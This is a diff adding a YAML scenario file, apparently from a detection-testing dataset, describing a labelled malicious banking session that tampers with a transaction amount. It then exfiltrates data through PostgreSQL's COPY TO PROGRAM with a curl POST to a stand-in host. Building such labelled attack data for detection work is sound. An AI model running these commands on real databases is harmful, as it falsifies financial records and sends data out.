@@ -1,0 +1,23 @@
+scenario_id: gen_banking_09_data_tamper_mal_188
+family_id: gen_banking_09_data_tamper_mal_fam188
+domain: banking
+time_of_day: 03:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: postgres
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.5
+  events:
+  - step_id: act
+    sql: UPDATE transactions SET amount = 623025 WHERE customer_id = 16910
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://clearinghouse-batch.example/ingest
+      -d @-'
+    connects_to:
+      ip: 192.168.22.206
+      port: 9443
